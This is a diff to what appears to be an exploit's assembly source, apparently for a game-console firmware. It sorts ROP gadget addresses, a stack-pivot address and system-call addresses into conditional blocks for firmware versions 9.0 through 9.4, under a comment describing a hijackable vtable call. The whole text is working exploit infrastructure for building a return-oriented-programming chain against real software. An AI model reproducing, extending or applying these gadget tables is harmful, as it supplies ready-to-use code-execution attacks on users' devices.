@@ -18,28 +18,49 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define HEAPBUF 0x35052080
 
 #define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.4 all regions)
-#define ROP_LOADR4_FROMOBJR0 0x10b574 //Addr for v9.3-v9.4 is 0x10b574, 0x10b64c for older versions. load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
-#define ROP_POPPC 0x10203c //Addr for v9.3-v9.4 is 0x10203c, 0x102028 for older versions.
 
-@ The below addrs are for v9.3-v9.4.
+#if SYSVER>=93 //v9.3-v9.4
+#define ROP_LOADR4_FROMOBJR0 0x10b574 //load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
+#define ROP_POPPC 0x10203c
+#else
+#define ROP_LOADR4_FROMOBJR0 0x10b64c
+#define ROP_POPPC 0x102028
+#endif
+
+#if SYSVER == 93
+#define SRV_GETSERVICEHANDLE 0x0022472c
+#elif SYSVER == 94
+#define SRV_GETSERVICEHANDLE 0x0022470c
+#endif
+
+#if SYSVER>=93 //v9.3-v9.4
 #define POP_R0PC 0x00154f0c
 
+#define ROP_STR_R1TOR0 0x00103f58
+#define ROP_LDR_R0FROMR0 0x0010f01c
 #define ROP_LDRR1R1_STRR1R0 0x002003bc
 #define ROP_MOVR1R3_BXIP 0x001c2e24
+#define ROP_ADDR0_TO_R1 0x0012b64c
+
 #define MEMCPY 0x00150940
 
 #define SVCSLEEPTHREAD 0x0012b590
 
-#define SRV_GETSERVICEHANDLE 0x0022470c //For v9.3 this addr is 0x0022472c.
-
 #define GXLOW_CMD4 0x0014ac9c
+#endif
 
-/*
-@ These addrs are for v9.2.
+#if SYSVER <= 92 //v9.0-v9.2
+#define ROP_STR_R1TOR0 0x00103f40
+#define ROP_LDR_R0FROMR0 0x0010efe8
+#define ROP_ADDR0_TO_R1 0x0012e708
+#endif
+
+#if SYSVER == 92
 #define POP_R0PC 0x001575ac
 
 #define ROP_LDRR1R1_STRR1R0 0x001f1e7c
 #define ROP_MOVR1R3_BXIP 0x001b8708
+
 #define MEMCPY 0x001536f8
 
 #define SVCSLEEPTHREAD 0x0012e64c
@@ -47,10 +68,9 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define SRV_GETSERVICEHANDLE 0x00212de0
 
 #define GXLOW_CMD4 0x0014d65c
-*/
+#endif
 
-/*
-@ These addrs are for v9.0 / v9.1j.
+#if SYSVER <= 91 //v9.0-v9.1j
 #define POP_R0PC 0x00157554
 
 #define ROP_LDRR1R1_STRR1R0 0x001f1ee4
@@ -62,7 +82,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define SRV_GETSERVICEHANDLE 0x00212e48
 
 #define GXLOW_CMD4 0x0014d604
-*/
+#endif
 
 _start:
 
